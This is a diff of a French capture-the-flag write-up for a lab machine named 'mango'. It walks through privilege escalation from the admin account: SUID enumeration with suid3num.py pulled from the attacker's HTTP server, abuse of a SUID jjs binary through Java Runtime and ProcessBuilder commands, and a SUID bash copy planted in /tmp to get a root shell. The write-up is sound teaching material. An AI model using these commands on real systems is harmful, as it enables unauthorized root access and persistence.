@@ -1135,164 +1135,326 @@ admin@mango:/home/mango$ cat /home/admin/user.txt
 
 ## Escalade de privilèges
 
-{{< escalade-intro-v2 user="ssh_user" >}}
-
-
-### Observation passive avec pspy64
-
-```bash
-./pspy64
-```
-
-Si système 32 bits :
-
-```bash
-./pspy32
-```
+{{< escalade-intro-v2 user="admin" >}}
 
 ### Vérification sudo
+
+Commence par vérifier si le compte `admin` dispose de droits particuliers via `sudo` :
 
 ```bash
 sudo -l
 ```
 
-### Exploration du contexte utilisateur
+Le système demande le mot de passe du compte, puis indique qu’aucune commande ne peut être exécutée avec `sudo` :
 
 ```bash
-whoami
-id
-pwd
-uname -a
-hostname
-find /home /opt -type f -readable 2>/dev/null
+[sudo] password for admin:
+Sorry, user admin may not run sudo on mango.
 ```
 
+Cette piste ne permet donc pas d’obtenir davantage de privilèges.
+
 ### Capabilities
+
+Tu peux ensuite rechercher les fichiers disposant de capabilities particulières :
 
 ```bash
 getcap -r / 2>/dev/null
 ```
-Les capabilities permettent d’accorder à un programme certains privilèges normalement réservés à root, sans lui attribuer l’ensemble de ses droits.
+
+Un seul résultat apparaît :
+
+```bash
+/usr/bin/mtr-packet = cap_net_raw+ep
+```
+
+La capability `cap_net_raw` permet notamment à `mtr-packet` d’utiliser des sockets réseau bruts sans devoir être exécuté directement en tant que `root`.
+
+Dans ce cas, elle ne fournit cependant pas de possibilité évidente d’exécuter des commandes avec des privilèges supérieurs.
+
+Il faut donc poursuivre l’énumération avec la recherche des binaires SUID.
 
 ### SUID
+
+Pour faciliter la recherche des binaires SUID, utilise `suid3num.py`.
+
+Depuis Kali, place-toi dans le répertoire contenant le script et démarre un petit serveur HTTP, comme décrit dans la recette {{< recette "copier-fichiers-kali" >}} :
+
+```bash
+python3 -m http.server 8000
+```
+
+Depuis la machine cible, télécharge ensuite `suid3num.py` dans `/dev/shm` :
+
+```bash
+cd /dev/shm
+wget http://10.10.15.96:8000/suid3num.py
+```
+
+Puis exécute le script :
 
 ```bash
 python3 suid3num.py
 ```
 
-Alternative :
+Parmi les résultats, `suid3num.py` distingue deux binaires considérés comme personnalisés ou intéressants :
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
+/usr/bin/run-mailcap
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+------------------------------
 ```
 
-Un binaire SUID s’exécute avec les privilèges de son propriétaire plutôt qu’avec ceux de l’utilisateur qui le lance.
-
-### Services locaux
+Le script indique également que `jjs` figure dans la liste GTFOBins :
 
 ```bash
-ss -tulnp
+[#] SUID Binaries in GTFO bins list (Hell Yeah!)
+------------------------------
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs -~> https://gtfobins.github.io/gtfobins/jjs/#suid
+------------------------------
 ```
 
-Alternative :
+Enfin, `suid3num.py` propose directement une commande d’exploitation :
 
 ```bash
-netstat -tulnp
+[&] Manual Exploitation (Binaries which create files on the system)
+------------------------------
+[&] Jjs ( /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs )
+echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-Cette commande affiche les sockets TCP et UDP en écoute ainsi que leurs adresses et leurs ports. Elle permettra notamment de repérer les services accessibles uniquement depuis la machine locale.
+Avant d’exécuter cette commande, il est toutefois préférable de vérifier manuellement les permissions de `jjs` et de comprendre ce que la commande proposée cherche à faire.
 
-### Recherche d’un service derrière un port local
+### Exploitation du SUID
 
-Exemple avec le port `8080` :
+Avant d’utiliser la commande proposée automatiquement par `suid3num.py`, vérifie d’abord manuellement les permissions de `jjs` :
 
 ```bash
-grep -r ':8080' /etc 2>/dev/null
+ls -l /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-Recherche élargie :
+Le résultat confirme que le binaire appartient à `root` et possède bien le bit SUID.
+
+Le principe est important à comprendre : lorsqu’un programme SUID appartenant à `root` est exécuté, il peut fonctionner avec les privilèges effectifs de `root`, même s’il est lancé depuis le compte `admin`.
+
+Dans notre cas, `jjs` est particulièrement intéressant puisqu’il s’agit d’un interpréteur JavaScript capable d’utiliser les classes Java pour lancer des commandes système.
+
+`suid3num.py` propose directement la commande suivante :
 
 ```bash
-grep -r '8080' /etc 2>/dev/null
+echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-### Tunnel SSH vers un service local
+Cette commande peut sembler difficile à lire, mais son principe de base est assez simple.
 
-Exemple avec un service local sur `127.0.0.1:8080` :
+La partie :
+
+```javascript
+Java.type('java.lang.Runtime').getRuntime().exec(...)
+```
+
+permet à `jjs` d’utiliser la classe Java `java.lang.Runtime` pour lancer une commande système.
+
+Autrement dit, `jjs` ne se limite pas à exécuter du JavaScript : il peut aussi appeler des classes Java capables de démarrer des programmes externes.
+
+La commande proposée par `suid3num.py` va cependant plus loin que cela. Elle essaie directement d’ouvrir un shell privilégié et de rediriger ses entrées et sorties vers le terminal courant.
+
+Dans notre cas, l’exécution de cette commande a bloqué le terminal sans fournir de shell correctement exploitable.
+
+Ce comportement est probablement lié au contexte de ta session : tu es déjà passé par plusieurs couches de shell, depuis la connexion SSH avec le compte `mango`, puis un `su admin`. La commande GTFOBins tente encore d’ouvrir un shell privilégié tout en redirigeant ses entrées et sorties vers le terminal courant. Cet empilement de sessions et de redirections peut donc perturber la gestion du TTY.
+
+Plutôt que d’insister avec cette commande complexe, il est plus sûr de repartir du mécanisme essentiel et de tester d’abord une commande simple et contrôlée.
+
+Tu pourrais, par exemple, demander à `jjs` d’exécuter directement la commande `id` :
+
+```javascript
+Java.type("java.lang.Runtime").getRuntime().exec("/usr/bin/id")
+```
+
+Cette commande lance bien `id`, mais `Runtime.exec()` n’affiche pas directement sa sortie dans ton terminal.
+
+Pour rendre le test plus lisible, tu peux utiliser une autre classe Java prévue elle aussi pour lancer des processus : `ProcessBuilder`.
+
+Son avantage ici est qu’elle permet facilement de rattacher le processus lancé à ton terminal courant grâce à :
+
+```javascript
+inheritIO()
+```
+
+Tu peux alors demander à `jjs` de lancer Bash puis d’exécuter `id` :
 
 ```bash
-ssh -L 8080:127.0.0.1:8080 user@target
+echo 'new java.lang.ProcessBuilder("/bin/bash","-p","-c","id").inheritIO().start().waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-Accès depuis Kali :
+La partie :
 
 ```text
-http://localhost:8080
+/bin/bash -p -c id
 ```
 
-### Linpeas
+signifie simplement :
+
+- lancer Bash ;
+- conserver les privilèges effectifs avec `-p` ;
+- exécuter la commande `id`.
+
+Le résultat obtenu est :
 
 ```bash
-./linpeas.sh
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs> new java.lang.ProcessBuilder("/bin/bash","-p","-c","id").inheritIO().start().waitFor()
+uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
+0
+jjs>
 ```
 
-### Dernier recours : le kernel
+La partie importante est :
 
 ```bash
-uname -a
-./les.sh
+euid=0(root)
 ```
 
-### Conclusion de l’énumération privilege escalation
+Ton UID réel reste celui du compte `admin`, mais l’UID effectif du processus est bien celui de `root`.
 
-À la fin de cette phase, tu peux résumer les pistes testées :
+Le `0` affiché juste après correspond simplement au code de retour de la commande : `0` indique qu’elle s’est terminée correctement.
 
-* sudo
-* contexte utilisateur
-* fichiers lisibles
-* capabilities
-* SUID
-* cron et timers
-* services locaux
-* LinPEAS
-* kernel
+Cela confirme que le bit SUID de `jjs` permet bien d’exécuter des commandes avec les privilèges effectifs de `root`.
 
-Dans ce cas précis, la piste exploitable est :
+Il reste maintenant à transformer cette possibilité en un shell privilégié pratique à utiliser.
+
+### Root shell
+
+À ce stade, deux voies s’imposent naturellement pour transformer l’exécution avec `euid=0(root)` en shell réellement pratique :
+
+- lancer un reverse shell privilégié vers Kali ;
+- créer une copie de Bash capable de conserver les privilèges de `root` avec l’option `-p`.
+
+Comme tu disposes déjà d’un accès interactif à la machine cible, il est plus simple de rester en local. Cela évite de lancer un listener sur Kali, d’ouvrir une nouvelle connexion réseau et d’ajouter une session supplémentaire à gérer.
+
+Tu vas donc utiliser la seconde méthode.
+
+#### Root shell dans `/dev/shm`
+
+Puisque tu travailles déjà dans `/dev/shm`, l’idée la plus naturelle est d’y créer une copie de Bash.
+
+Grâce à `jjs`, tu peux demander à un processus exécuté avec `euid=0(root)` de copier `/bin/bash` :
+
+```bash
+echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/cp /bin/bash /dev/shm/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+
+Tu peux ensuite attribuer le bit SUID à cette copie :
+
+```bash
+echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/chmod 4755 /dev/shm/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+
+L’objectif est que `rootbash`, appartenant à `root` et possédant le bit SUID, puisse ensuite être lancé avec :
+
+```bash
+/dev/shm/rootbash -p
+```
+
+L’option `-p` demande à Bash de conserver ses privilèges effectifs.
+
+Cette tentative ne fonctionne cependant pas comme prévu.
+
+Même si le fichier possède bien le bit SUID, celui-ci n’est pas pris en compte lorsqu’il est exécuté depuis `/dev/shm`.
+
+La raison vient des options de montage de ce système de fichiers.
+
+Tu peux les vérifier avec :
+
+```bash
+mount | grep '/dev/shm'
+```
+
+Le résultat est sans ambiguïté :
+
+```bash
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+```
+
+L’option :
 
 ```text
-<résumer ici la piste réellement exploitée>
+nosuid
 ```
 
-### Exploitation de la piste identifiée
+indique au noyau d’ignorer les bits SUID et SGID des fichiers exécutés depuis ce point de montage.
 
-Tu exploites ensuite la mauvaise configuration identifiée pendant l’énumération.
+Autrement dit, même si `/dev/shm/rootbash` appartient à `root` et possède bien le bit SUID, celui-ci ne sera pas pris en compte lors de son exécution depuis `/dev/shm`.
+
+Il faut donc choisir un autre emplacement.
+
+#### Root shell dans `/tmp`
+
+Comme `/dev/shm` est monté avec l’option `nosuid`, il faut choisir un autre emplacement.
+
+Tu peux reprendre exactement la même méthode dans `/tmp`.
+
+Commence par demander à `jjs` de copier `/bin/bash` vers `/tmp/rootbash` :
 
 ```bash
-<commandes d’exploitation>
+echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/cp /bin/bash /tmp/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-Tu confirmes l’élévation de privilèges :
+Le code de retour `0` indique que la copie s’est correctement déroulée.
+
+Attribue ensuite le bit SUID à cette copie :
 
 ```bash
-whoami
+echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/chmod 4755 /tmp/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+
+Vérifie les permissions :
+
+```bash
+ls -l /tmp/rootbash
+```
+
+Le résultat confirme que le fichier appartient à `root` et possède bien le bit SUID :
+
+```text
+-rwsr-xr-x 1 root admin 1113504 Sep  7 09:30 /tmp/rootbash
+```
+
+Tu peux maintenant lancer cette copie avec l’option `-p` :
+
+```bash
+/tmp/rootbash -p
+```
+
+Le prompt change :
+
+```text
+rootbash-4.4#
+```
+
+Vérifie immédiatement les privilèges obtenus :
+
+```bash
 id
-hostname
 ```
 
-Résultat attendu :
+Le résultat confirme que ton UID réel reste celui de `admin`, mais que ton UID effectif est bien celui de `root` :
 
 ```text
-root
-uid=0(root) gid=0(root) groups=0(root)
-machine
+uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
 ```
+
+Tu disposes donc maintenant d’un shell privilégié.
 
 ### root.txt
 
-Une fois root, tu peux lire le flag final :
+Une fois root, Il ne te reste plus qu’à récupérer le flag final :
 
 ```bash
 cat /root/root.txt
+722cxxxxxxxxxxxxxxxxxxxxxxxxxxxc5ec
 ```
 
 Cette étape termine l’escalade de privilèges.
